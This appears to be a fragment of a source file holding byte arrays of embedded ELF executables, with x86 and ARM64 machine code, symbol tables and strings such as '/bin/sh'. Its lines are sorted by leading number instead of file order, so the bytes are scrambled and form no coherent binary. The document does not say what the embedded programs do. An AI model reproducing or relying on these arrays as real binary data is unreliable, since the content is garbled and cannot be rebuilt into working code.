"  121, 240, 255, 255, 7, 0, 0, 0, 0, 65, 14, 16, 134, 2, 67, 13,"
"  123, 0, 0, 0, 18, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  124, 8, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  126, 0, 0, 0, 0, 65, 14, 8, 133, 2, 66, 13, 5, 68, 131, 3,"
"  127, 69, 76, 70, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  127, 69, 76, 70, 2, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  128, 0, 0, 0, 16, 0, 0, 0, 0, 0, 0, 0, 16, 105, 105, 13,"
"  128, 0, 0, 0, 9, 0, 0, 0, 66, 0, 0, 0, 180, 3, 0, 0,"
"  128, 0, 0, 144, 0, 236, 71, 249, 64, 0, 0, 180, 241, 255, 255, 23,"
"  128, 0, 0, 176, 0, 224, 0, 145, 129, 0, 0, 176, 33, 224, 0, 145,"
"  128, 0, 0, 180, 128, 0, 0, 176, 0, 24, 64, 249, 193, 255, 255, 151,"
"  128, 1, 0, 0, 18, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  128, 239, 255, 255, 80, 0, 0, 0, 0, 14, 16, 70, 14, 24, 74, 15,"
"  128, 32, 0, 0, 0, 0, 0, 0, 128, 0, 0, 0, 0, 0, 0, 0,"
"  128, 6, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  128, 8, 0, 0, 0, 0, 0, 0, 128, 8, 0, 0, 0, 0, 0, 0,"
"  13, 0, 0, 0, 0, 0, 0, 0, 184, 17, 0, 0, 0, 0, 0, 0,"
"  13, 0, 0, 0, 0, 0, 0, 0, 48, 7, 0, 0, 0, 0, 0, 0,"
"  13, 0, 0, 0, 16, 18, 0, 0, 25, 0, 0, 0, 8, 63, 0, 0,"
"  131, 236, 12, 106, 0, 232, 150, 254, 255, 255, 131, 196, 16, 131, 236, 12,"
"  131, 240, 221, 29, 81, 255, 51, 58, 4, 0, 0, 0, 24, 0, 0, 0,"
"  131, 244, 255, 255, 255, 133, 192, 116, 18, 131, 236, 12, 255, 179, 28, 0,"
"  132, 0, 0, 0, 1, 0, 0, 0, 6, 0, 0, 0, 48, 16, 0, 0,"
"  132, 8, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  133, 192, 116, 2, 255, 208, 72, 131, 196, 8, 195, 0, 0, 0, 0, 0,"
"  133, 2, 66, 13, 5, 68, 131, 3, 16, 0, 0, 0, 124, 0, 0, 0,"
"  133, 2, 66, 13, 5, 76, 197, 12, 4, 4, 0, 0, 24, 0, 0, 0,"
"  136, 8, 0, 0, 0, 0, 0, 0, 136, 8, 0, 0, 0, 0, 0, 0,"
"  137, 195, 193, 232, 31, 193, 251, 2, 1, 216, 209, 248, 116, 20, 139, 146,"
"  138, 32, 0, 0, 0, 141, 130, 32, 0, 0, 0, 131, 236, 4, 41, 200,"
"  139, 28, 36, 195, 102, 144, 102, 144, 102, 144, 102, 144, 102, 144, 102, 144,"
"  14, 0, 0, 0, 2, 0, 12, 0, 160, 16, 0, 0, 0, 0, 0, 0,"
"  141, 131, 0, 224, 255, 255, 137, 69, 228, 199, 69, 232, 0, 0, 0, 0,"
"  141, 131, 16, 224, 255, 255, 137, 69, 236, 199, 69, 240, 0, 0, 0, 0,"
"  141, 131, 8, 224, 255, 255, 137, 69, 236, 199, 69, 240, 0, 0, 0, 0,"
"  141, 85, 236, 82, 141, 85, 228, 82, 80, 232, 98, 254, 255, 255, 131, 196,"
"  144, 0, 0, 0, 104, 254, 255, 255, 84, 0, 0, 0, 0, 65, 14, 64,"
"  144, 0, 0, 176, 17, 10, 64, 249, 16, 66, 0, 145, 32, 2, 31, 214,"
"  144, 0, 0, 176, 17, 14, 64, 249, 16, 98, 0, 145, 32, 2, 31, 214,"
"  144, 0, 0, 176, 17, 18, 64, 249, 16, 130, 0, 145, 32, 2, 31, 214,"
"  144, 0, 0, 176, 17, 2, 64, 249, 16, 2, 0, 145, 32, 2, 31, 214,"
"  144, 0, 0, 176, 17, 22, 64, 249, 16, 162, 0, 145, 32, 2, 31, 214,"
"  144, 0, 0, 176, 17, 6, 64, 249, 16, 34, 0, 145, 32, 2, 31, 214,"
"  144, 239, 255, 255, 80, 0, 0, 0, 0, 14, 8, 70, 14, 12, 74, 15,"
"  144, 254, 255, 255, 4, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  148, 2, 0, 0, 160, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  149, 0, 0, 0, 1, 0, 0, 0, 6, 0, 0, 0, 16, 18, 0, 0,"
"  149, 0, 0, 0, 4, 0, 241, 255, 0, 0, 0, 0, 0, 0, 0, 0,"
"  151, 145, 150, 6, 0, 0, 2, 0, 138, 0, 0, 0, 0, 0, 0, 0,"
"  152, 1, 0, 0, 18, 0, 11, 0, 212, 6, 0, 0, 0, 0, 0, 0,"
"  152, 1, 0, 0, 40, 0, 0, 0, 40, 0, 0, 0, 4, 0, 0, 0,"
"  156, 7, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  156, 7, 0, 0, 0, 0, 0, 0, 156, 7, 0, 0, 0, 0, 0, 0,"
"  156, 7, 0, 0, 0, 0, 0, 0, 60, 0, 0, 0, 0, 0, 0, 0,"
"  157, 4, 158, 3, 66, 147, 2, 78, 222, 221, 211, 14, 0, 0, 0, 0,"
"  157, 8, 158, 7, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  159, 0, 0, 0, 1, 0, 16, 0, 244, 32, 0, 0, 0, 0, 0, 0,"
"  159, 0, 0, 0, 1, 0, 16, 0, 252, 32, 0, 0, 0, 0, 0, 0,"
"  16, 0, 0, 0, 0, 0, 0, 0, 1, 122, 82, 0, 4, 120, 30, 1,"
"  16, 0, 0, 0, 0, 0, 0, 0, 145, 0, 0, 0, 1, 0, 0, 0,"
"  16, 0, 0, 0, 0, 0, 0, 0, 203, 0, 0, 0, 1, 0, 0, 0,"
"  16, 0, 0, 0, 0, 0, 0, 0, 222, 0, 0, 0, 1, 0, 0, 0,"
"  16, 0, 0, 0, 0, 65, 14, 8, 133, 2, 66, 13, 5, 76, 197, 12,"
"  16, 0, 0, 0, 124, 0, 0, 0, 124, 254, 255, 255, 8, 0, 0, 0,"
"  16, 0, 0, 0, 124, 0, 0, 0, 3, 241, 255, 255, 4, 0, 0, 0,"
"  16, 0, 0, 0, 32, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  16, 0, 0, 0, 4, 0, 0, 0, 143, 0, 0, 0, 1, 0, 0, 0,"
"  16, 0, 0, 0, 44, 0, 0, 0, 56, 254, 255, 255, 60, 0, 0, 0,"
"  16, 0, 0, 0, 82, 229, 116, 100, 8, 47, 0, 0, 8, 63, 0, 0,"
"  16, 131, 236, 12, 106, 0, 232, 69, 254, 255, 255, 139, 4, 36, 195, 0,"
"  16, 18, 0, 0, 24, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  16, 2, 0, 0, 0, 0, 0, 0, 16, 2, 0, 0, 0, 0, 0, 0,"
"  16, 201, 195, 141, 116, 38, 0, 144, 195, 141, 180, 38, 0, 0, 0, 0,"
"  16, 23, 0, 0, 0, 0, 0, 0, 213, 1, 0, 0, 0, 0, 0, 0,"
"  16, 46, 0, 0, 0, 0, 0, 0, 16, 62, 0, 0, 0, 0, 0, 0,"
"  16, 46, 0, 0, 0, 0, 0, 0, 8, 0, 0, 0, 0, 0, 0, 0,"
"  16, 47, 0, 0, 224, 0, 0, 0, 5, 0, 0, 0, 0, 0, 0, 0,"
"  16, 6, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  16, 62, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  16, 62, 0, 0, 0, 0, 0, 0, 16, 62, 0, 0, 0, 0, 0, 0,"
"  16, 62, 0, 0, 0, 0, 0, 0, 48, 2, 0, 0, 0, 0, 0, 0,"
"  16, 62, 0, 0, 0, 0, 0, 0, 8, 0, 0, 0, 0, 0, 0, 0,"
"  16, 63, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 70, 16, 0, 0,"
"  16, 63, 0, 0, 224, 0, 0, 0, 224, 0, 0, 0, 6, 0, 0, 0,"
"  163, 0, 0, 0, 1, 0, 0, 0, 2, 0, 0, 0, 84, 32, 0, 0,"
"  163, 0, 0, 0, 1, 0, 0, 0, 2, 0, 0, 0, 92, 32, 0, 0,"
"  164, 254, 255, 255, 100, 0, 0, 0, 228, 254, 255, 255, 120, 0, 0, 0,"
"  164, 7, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  164, 7, 0, 0, 0, 0, 0, 0, 164, 7, 0, 0, 0, 0, 0, 0,"
"  164, 7, 0, 0, 0, 0, 0, 0, 60, 0, 0, 0, 0, 0, 0, 0,"
"  168, 2, 0, 0, 0, 0, 0, 0, 168, 2, 0, 0, 0, 0, 0, 0,"
"  168, 2, 0, 0, 0, 0, 0, 0, 48, 0, 0, 0, 0, 0, 0, 0,"
"  168, 5, 0, 0, 0, 0, 0, 0, 96, 0, 0, 0, 0, 0, 0, 0,"
"  17, 0, 0, 0, 124, 3, 0, 0, 18, 0, 0, 0, 56, 0, 0, 0,"
"  17, 0, 0, 0, 3, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  173, 0, 0, 0, 2, 0, 13, 0, 184, 17, 0, 0, 0, 0, 0, 0,"
"  174, 1, 0, 0, 18, 0, 12, 0, 64, 17, 0, 0, 0, 0, 0, 0,"
"  175, 241, 255, 255, 164, 0, 0, 0, 20, 0, 0, 0, 0, 0, 0, 0,"
"  176, 1, 0, 0, 32, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  179, 1, 0, 0, 2, 0, 10, 0, 0, 16, 0, 0, 0, 0, 0, 0,"
"  18, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  18, 0, 0, 0, 102, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  18, 0, 0, 0, 116, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  18, 0, 0, 0, 136, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  18, 0, 0, 0, 166, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  18, 0, 0, 0, 183, 1, 0, 0, 125, 17, 0, 0, 16, 0, 0, 0,"
"  18, 0, 0, 0, 206, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  18, 0, 0, 0, 44, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  18, 0, 12, 0, 0, 95, 95, 103, 109, 111, 110, 95, 115, 116, 97, 114,"
"  18, 0, 12, 0, 0, 99, 114, 116, 115, 116, 117, 102, 102, 46, 99, 0,"
"  18, 0, 12, 0, 189, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  18, 0, 12, 0, 91, 0, 0, 0, 141, 17, 0, 0, 126, 0, 0, 0,"
"  180, 3, 0, 0, 32, 0, 0, 0, 4, 0, 0, 0, 21, 0, 0, 0,"
"  182, 0, 0, 0, 4, 0, 241, 255, 0, 0, 0, 0, 0, 0, 0, 0,"
"  184, 17, 0, 0, 0, 0, 0, 0, 13, 0, 0, 0, 0, 0, 0, 0,"
"  187, 0, 0, 0, 14, 0, 0, 0, 3, 0, 0, 0, 8, 63, 0, 0,"
"  19, 0, 0, 0, 8, 0, 0, 0, 254, 255, 255, 111, 76, 3, 0, 0,"
"  192, 0, 0, 0, 1, 0, 15, 0, 124, 8, 0, 0, 0, 0, 0, 0,"
"  192, 0, 0, 0, 1, 0, 15, 0, 132, 8, 0, 0, 0, 0, 0, 0,"
"  192, 0, 0, 0, 1, 0, 19, 0, 32, 62, 0, 0, 0, 0, 0, 0,"
"  192, 1, 0, 0, 0, 0, 0, 0, 192, 1, 0, 0, 0, 0, 0, 0,"
"  192, 1, 0, 0, 36, 0, 0, 0, 4, 0, 0, 0, 0, 0, 0, 0,"
"  192, 15, 0, 0, 0, 0, 0, 0, 40, 0, 0, 0, 0, 0, 0, 0,"
"  192, 15, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  192, 3, 95, 214, 0, 0, 0, 0, 47, 117, 115, 114, 47, 98, 105, 110,"
"  192, 3, 95, 214, 0, 0, 0, 0, 47, 98, 105, 110, 47, 115, 104, 0,"
"  192, 3, 95, 214, 31, 32, 3, 213, 31, 32, 3, 213, 31, 32, 3, 213,"
"  193, 0, 0, 180, 130, 0, 0, 144, 66, 240, 71, 249, 98, 0, 0, 180,"
"  195, 102, 102, 46, 15, 31, 132, 0, 0, 0, 0, 0, 15, 31, 64, 0,"
"  196, 16, 139, 93, 252, 201, 195, 141, 180, 38, 0, 0, 0, 0, 102, 144,"
"  196, 8, 91, 195, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  197, 1, 0, 0, 0, 0, 0, 0, 0, 16, 0, 0, 0, 0, 0, 0,"
"  198, 131, 32, 0, 0, 0, 1, 139, 93, 252, 201, 195, 141, 116, 38, 0,"
"  198, 4, 0, 0, 0, 0, 0, 0, 22, 0, 0, 0, 0, 0, 0, 0,"
"  2, 0, 0, 0, 0, 0, 0, 0, 0, 3, 0, 0, 0, 0, 0, 0,"
"  2, 0, 0, 0, 0, 0, 0, 0, 0, 32, 0, 0, 0, 0, 0, 0,"
"  2, 0, 0, 0, 0, 0, 0, 0, 0, 4, 0, 0, 0, 0, 0, 0,"
"  2, 0, 0, 0, 0, 0, 0, 0, 0, 5, 0, 0, 0, 0, 0, 0,"
"  2, 0, 0, 0, 0, 0, 0, 0, 104, 0, 0, 0, 254, 255, 255, 111,"
"  2, 0, 0, 0, 0, 0, 0, 0, 120, 32, 0, 0, 0, 0, 0, 0,"
"  2, 0, 0, 0, 0, 0, 0, 0, 128, 32, 0, 0, 0, 0, 0, 0,"
"  2, 0, 0, 0, 0, 0, 0, 0, 144, 0, 0, 0, 0, 0, 0, 0,"
"  2, 0, 0, 0, 0, 0, 0, 0, 156, 7, 0, 0, 0, 0, 0, 0,"
"  2, 0, 0, 0, 0, 0, 0, 0, 164, 7, 0, 0, 0, 0, 0, 0,"
"  2, 0, 0, 0, 0, 0, 0, 0, 168, 2, 0, 0, 0, 0, 0, 0,"
"  2, 0, 0, 0, 0, 0, 0, 0, 198, 4, 0, 0, 0, 0, 0, 0,"
"  2, 0, 0, 0, 0, 0, 0, 0, 200, 1, 0, 0, 0, 0, 0, 0,"
"  2, 0, 0, 0, 0, 0, 0, 0, 216, 2, 0, 0, 0, 0, 0, 0,"
"  2, 0, 0, 0, 0, 0, 0, 0, 216, 7, 0, 0, 0, 0, 0, 0,"
"  2, 0, 0, 0, 0, 0, 0, 0, 224, 4, 0, 0, 0, 0, 0, 0,"
"  2, 0, 0, 0, 0, 0, 0, 0, 224, 7, 0, 0, 0, 0, 0, 0,"
"  2, 0, 0, 0, 0, 0, 0, 0, 230, 3, 0, 0, 0, 0, 0, 0,"
"  2, 0, 0, 0, 0, 0, 0, 0, 24, 2, 0, 0, 0, 0, 0, 0,"
"  2, 0, 0, 0, 0, 0, 0, 0, 240, 1, 0, 0, 0, 0, 0, 0,"
"  2, 0, 0, 0, 0, 0, 0, 0, 32, 4, 0, 0, 0, 0, 0, 0,"
"  2, 0, 0, 0, 0, 0, 0, 0, 40, 3, 0, 0, 0, 0, 0, 0,"
"  2, 0, 0, 0, 0, 0, 0, 0, 48, 4, 0, 0, 0, 0, 0, 0,"
"  2, 0, 0, 0, 0, 0, 0, 0, 72, 7, 0, 0, 0, 0, 0, 0,"
"  2, 0, 0, 0, 0, 0, 0, 0, 80, 3, 0, 0, 0, 0, 0, 0,"
"  2, 0, 0, 0, 0, 0, 0, 0, 84, 32, 0, 0, 0, 0, 0, 0,"
"  2, 0, 0, 0, 0, 0, 0, 0, 85, 0, 0, 0, 254, 255, 255, 111,"
"  2, 0, 0, 0, 0, 0, 0, 0, 92, 32, 0, 0, 0, 0, 0, 0,"
"  2, 0, 0, 0, 0, 0, 0, 0, 96, 0, 0, 0, 0, 0, 0, 0,"
"  2, 0, 0, 0, 0, 32, 0, 0, 0, 32, 0, 0, 83, 0, 0, 0,"
"  2, 0, 0, 0, 0, 32, 0, 0, 0, 32, 0, 0, 91, 0, 0, 0,"
"  2, 0, 0, 0, 11, 0, 0, 0, 1, 0, 0, 0, 6, 0, 0, 0,"
"  2, 0, 0, 0, 124, 3, 0, 0, 124, 3, 0, 0, 56, 0, 0, 0,"
"  2, 0, 0, 0, 128, 32, 0, 0, 128, 32, 0, 0, 144, 0, 0, 0,"
"  2, 0, 0, 0, 136, 32, 0, 0, 136, 32, 0, 0, 144, 0, 0, 0,"
"  2, 0, 0, 0, 152, 1, 0, 0, 152, 1, 0, 0, 40, 0, 0, 0,"
"  2, 0, 0, 0, 2, 0, 2, 0, 1, 0, 1, 0, 0, 0, 0, 0,"
"  2, 0, 0, 0, 228, 1, 0, 0, 228, 1, 0, 0, 176, 0, 0, 0,"
"  2, 0, 0, 0, 52, 3, 0, 0, 52, 3, 0, 0, 22, 0, 0, 0,"
"  2, 0, 0, 0, 6, 0, 0, 0, 0, 14, 0, 0, 0, 0, 0, 0,"
"  2, 0, 0, 0, 6, 0, 0, 0, 32, 46, 0, 0, 0, 0, 0, 0,"
"  2, 0, 0, 0, 9, 0, 0, 0, 1, 0, 0, 0, 5, 0, 0, 0,"
"  2, 0, 0, 0, 9, 0, 0, 0, 1, 0, 0, 0, 6, 0, 0, 0,"
"  2, 0, 10, 0, 64, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  2, 0, 12, 0, 118, 0, 0, 0, 8, 63, 0, 0, 0, 0, 0, 0,"
"  2, 0, 12, 0, 14, 0, 0, 0, 208, 16, 0, 0, 0, 0, 0, 0,"
"  2, 0, 12, 0, 195, 0, 0, 0, 16, 18, 0, 0, 0, 0, 0, 0,"
"  2, 0, 12, 0, 2, 1, 0, 0, 16, 63, 0, 0, 0, 0, 0, 0,"
"  2, 0, 12, 0, 223, 0, 0, 0, 28, 64, 0, 0, 0, 0, 0, 0,"
"  2, 0, 12, 0, 33, 0, 0, 0, 32, 17, 0, 0, 0, 0, 0, 0,"
"  2, 0, 12, 0, 55, 0, 0, 0, 32, 64, 0, 0, 1, 0, 0, 0,"
"  2, 0, 13, 0, 201, 0, 0, 0, 121, 17, 0, 0, 0, 0, 0, 0,"
"  2, 4, 0, 0, 3, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  2, 4, 0, 0, 6, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  2, 4, 0, 0, 8, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  20, 0, 0, 0, 0, 0, 0, 0, 1, 122, 82, 0, 1, 120, 16, 1,"
"  20, 0, 0, 0, 0, 0, 0, 0, 1, 122, 82, 0, 1, 124, 8, 1,"
"  20, 0, 0, 0, 0, 0, 0, 0, 7, 0, 0, 0, 0, 0, 0, 0,"
"  20, 0, 0, 0, 0, 0, 0, 0, 8, 0, 0, 0, 0, 0, 9, 0,"
"  20, 0, 0, 0, 100, 0, 0, 0, 136, 254, 255, 255, 4, 0, 0, 0,"
"  20, 0, 0, 0, 17, 0, 0, 0, 23, 0, 0, 0, 180, 3, 0, 0,"
"  200, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  200, 1, 0, 0, 0, 0, 0, 0, 200, 1, 0, 0, 0, 0, 0, 0,"
"  200, 1, 0, 0, 0, 0, 0, 0, 36, 0, 0, 0, 0, 0, 0, 0,"
"  200, 4, 0, 0, 0, 0, 0, 0, 144, 0, 0, 0, 0, 0, 0, 0,"
"  204, 239, 255, 255, 60, 0, 0, 0, 229, 240, 255, 255, 100, 0, 0, 0,"
"  206, 0, 0, 0, 2, 0, 12, 0, 48, 7, 0, 0, 0, 0, 0, 0,"
"  207, 1, 0, 0, 2, 0, 9, 0, 88, 5, 0, 0, 0, 0, 0, 0,"
"  208, 15, 1, 0, 0, 0, 0, 0, 1, 4, 0, 0, 6, 0, 0, 0,"
"  208, 6, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  208, 6, 0, 0, 0, 0, 0, 0, 128, 6, 0, 0, 0, 0, 0, 0,"
"  208, 6, 0, 0, 0, 0, 0, 0, 248, 13, 1, 0, 0, 0, 0, 0,"
"  208, 72, 137, 206, 72, 137, 199, 232, 132, 254, 255, 255, 191, 0, 0, 0,"
"  209, 254, 116, 20, 72, 139, 5, 37, 47, 0, 0, 72, 133, 192, 116, 8,"
"  211, 0, 0, 0, 6, 0, 0, 0, 3, 0, 0, 0, 16, 63, 0, 0,"
"  212, 6, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  216, 2, 0, 0, 0, 0, 0, 0, 216, 2, 0, 0, 0, 0, 0, 0,"
"  216, 2, 0, 0, 0, 0, 0, 0, 36, 0, 0, 0, 0, 0, 0, 0,"
"  216, 255, 255, 151, 32, 0, 128, 82, 96, 226, 0, 57, 243, 11, 64, 249,"
"  216, 7, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  216, 7, 0, 0, 0, 0, 0, 0, 168, 0, 0, 0, 0, 0, 0, 0,"
"  219, 123, 142, 252, 140, 221, 122, 210, 239, 232, 124, 152, 0, 0, 0, 0,"
"  220, 0, 0, 0, 1, 0, 22, 0, 64, 64, 0, 0, 0, 0, 0, 0,"
"  220, 239, 255, 255, 68, 0, 0, 0, 41, 241, 255, 255, 104, 0, 0, 0,"
"  220, 254, 255, 255, 120, 0, 0, 0, 44, 255, 255, 255, 156, 0, 0, 0,"
"  220, 255, 255, 23, 31, 32, 3, 213, 192, 3, 95, 214, 253, 123, 188, 169,"
"  220, 6, 0, 0, 0, 0, 0, 0, 84, 0, 0, 0, 0, 0, 0, 0,"
"  221, 240, 255, 255, 100, 0, 0, 0, 228, 240, 255, 255, 132, 0, 0, 0,"
"  222, 221, 211, 14, 0, 0, 0, 0, 20, 0, 0, 0, 100, 0, 0, 0,"
"  224, 15, 1, 0, 0, 0, 0, 0, 1, 4, 0, 0, 10, 0, 0, 0,"
"  224, 15, 31, 128, 0, 0, 0, 0, 195, 15, 31, 128, 0, 0, 0, 0,"
"  224, 16, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  224, 19, 0, 249, 255, 23, 0, 249, 0, 0, 128, 82, 161, 255, 255, 151,"
"  224, 27, 0, 249, 255, 31, 0, 249, 0, 0, 0, 144, 0, 64, 29, 145,"
"  224, 27, 0, 249, 255, 31, 0, 249, 0, 0, 0, 144, 0, 96, 29, 145,"
"  224, 4, 0, 0, 0, 0, 0, 0, 32, 0, 0, 0, 0, 0, 0, 0,"
"  224, 47, 0, 0, 0, 0, 0, 0, 32, 0, 0, 0, 0, 0, 0, 0,"
"  224, 7, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  224, 7, 0, 0, 0, 0, 0, 0, 168, 0, 0, 0, 0, 0, 0, 0,"
"  225, 0, 0, 0, 1, 0, 0, 0, 3, 0, 0, 0, 0, 64, 0, 0,"
"  225, 0, 0, 0, 1, 0, 241, 255, 0, 14, 1, 0, 0, 0, 0, 0,"
"  225, 195, 0, 145, 175, 255, 255, 151, 0, 0, 128, 82, 157, 255, 255, 151,"
"  225, 52, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0,"
"  229, 24, 0, 0, 0, 0, 0, 0, 237, 0, 0, 0, 0, 0, 0, 0,"
"  23, 0, 0, 0, 0, 0, 0, 0, 168, 5, 0, 0, 0, 0, 0, 0,"
"  23, 0, 0, 0, 0, 0, 0, 0, 200, 4, 0, 0, 0, 0, 0, 0,"
"  230, 3, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  230, 3, 0, 0, 0, 0, 0, 0, 26, 0, 0, 0, 0, 0, 0, 0,"
"  232, 134, 0, 0, 0, 5, 123, 46, 0, 0, 144, 93, 195, 85, 137, 229,"
"  232, 15, 0, 0, 0, 0, 0, 0, 72, 0, 0, 0, 0, 0, 0, 0,"
"  232, 164, 0, 0, 0, 129, 194, 43, 47, 0, 0, 85, 137, 229, 83, 141,"
"  232, 171, 254, 255, 255, 72, 139, 69, 208, 72, 141, 85, 224, 72, 141, 77,"
"  232, 228, 0, 0, 0, 129, 194, 107, 47, 0, 0, 141, 138, 32, 0, 0,"
"  232, 63, 0, 0, 0, 0, 0, 0, 6, 0, 0, 0, 3, 0, 0, 0,"
"  236, 240, 255, 255, 132, 0, 0, 0, 20, 0, 0, 0, 0, 0, 0, 0,"
"  24, 0, 0, 0, 0, 0, 0, 0, 110, 0, 0, 0, 4, 0, 0, 0,"
"  24, 0, 0, 0, 0, 0, 0, 0, 120, 0, 0, 0, 1, 0, 0, 0,"
"  24, 0, 0, 0, 0, 0, 0, 0, 129, 0, 0, 0, 4, 0, 0, 0,"
"  24, 0, 0, 0, 0, 0, 0, 0, 139, 0, 0, 0, 1, 0, 0, 0,"
"  24, 0, 0, 0, 0, 0, 0, 0, 64, 0, 0, 0, 3, 0, 0, 0,"
"  24, 0, 0, 0, 0, 0, 0, 0, 83, 0, 0, 0, 3, 0, 0, 0,"
"  24, 0, 0, 0, 0, 0, 0, 0, 9, 0, 0, 0, 3, 0, 0, 0,"
"  24, 0, 0, 0, 100, 0, 0, 0, 88, 240, 255, 255, 118, 0, 0, 0,"
"  24, 0, 0, 0, 28, 254, 255, 255, 48, 0, 0, 0, 0, 0, 0, 0,"
"  24, 16, 1, 0, 0, 0, 0, 0, 2, 4, 0, 0, 7, 0, 0, 0,"
"  24, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  24, 2, 0, 0, 0, 0, 0, 0, 56, 1, 0, 0, 0, 0, 0, 0,"
"  24, 46, 0, 0, 0, 0, 0, 0, 8, 0, 0, 0, 0, 0, 0, 0,"
"  24, 62, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  240, 0, 0, 0, 8, 0, 0, 0, 3, 0, 0, 0, 32, 64, 0, 0,"
"  240, 1, 0, 0, 0, 0, 0, 0, 240, 1, 0, 0, 0, 0, 0, 0,"
"  240, 1, 0, 0, 0, 0, 0, 0, 40, 0, 0, 0, 0, 0, 0, 0,"
"  240, 123, 191, 169, 144, 0, 0, 144, 17, 254, 71, 249, 16, 226, 63, 145,"
"  240, 13, 0, 0, 0, 0, 0, 0, 240, 13, 1, 0, 0, 0, 0, 0,"
"  240, 13, 0, 0, 0, 0, 0, 0, 8, 0, 0, 0, 0, 0, 0, 0,"
"  240, 13, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  240, 13, 1, 0, 0, 0, 0, 0, 240, 13, 1, 0, 0, 0, 0, 0,"
"  240, 13, 1, 0, 0, 0, 0, 0, 3, 4, 0, 0, 0, 0, 0, 0,"
"  240, 13, 1, 0, 0, 0, 0, 0, 72, 2, 0, 0, 0, 0, 0, 0,"
"  240, 255, 255, 111, 0, 0, 0, 0, 198, 4, 0, 0, 0, 0, 0, 0,"
"  240, 255, 255, 111, 0, 0, 0, 0, 230, 3, 0, 0, 0, 0, 0, 0,"
"  240, 3, 2, 170, 0, 2, 31, 214, 192, 3, 95, 214, 31, 32, 3, 213,"
"  240, 5, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  240, 5, 0, 0, 0, 0, 0, 0, 64, 1, 0, 0, 0, 0, 0, 0,"
"  243, 15, 30, 250, 128, 61, 85, 47, 0, 0, 0, 117, 51, 85, 72, 131,"
"  243, 15, 30, 250, 233, 103, 255, 255, 255, 85, 72, 137, 229, 144, 93, 195,"
"  243, 15, 30, 250, 72, 131, 236, 8, 72, 139, 5, 217, 47, 0, 0, 72,"
"  243, 15, 30, 251, 233, 87, 255, 255, 255, 139, 20, 36, 195, 85, 137, 229,"
"  243, 15, 30, 251, 83, 131, 236, 8, 232, 115, 0, 0, 0, 129, 195, 243,"
"  243, 15, 30, 251, 83, 131, 236, 8, 232, 99, 254, 255, 255, 129, 195, 227,"
"  243, 15, 30, 251, 85, 137, 229, 83, 232, 83, 255, 255, 255, 129, 195, 211,"
"  245, 254, 255, 111, 0, 0, 0, 0, 0, 3, 0, 0, 0, 0, 0, 0,"
"  245, 254, 255, 111, 0, 0, 0, 0, 240, 1, 0, 0, 0, 0, 0, 0,"
"  247, 102, 85, 23, 255, 81, 180, 106, 24, 48, 219, 15, 0, 0, 0, 0,"
"  248, 0, 0, 0, 0, 0, 0, 0, 248, 0, 0, 0, 0, 0, 0, 0,"
"  248, 116, 21, 72, 139, 5, 86, 47, 0, 0, 72, 133, 192, 116, 9, 255,"
"  248, 13, 0, 0, 0, 0, 0, 0, 8, 0, 0, 0, 0, 0, 0, 0,"
"  248, 13, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  248, 63, 0, 0, 0, 0, 0, 0, 6, 0, 0, 0, 8, 0, 0, 0,"
"  249, 255, 255, 111, 0, 0, 0, 0, 3, 0, 0, 0, 0, 0, 0, 0,"
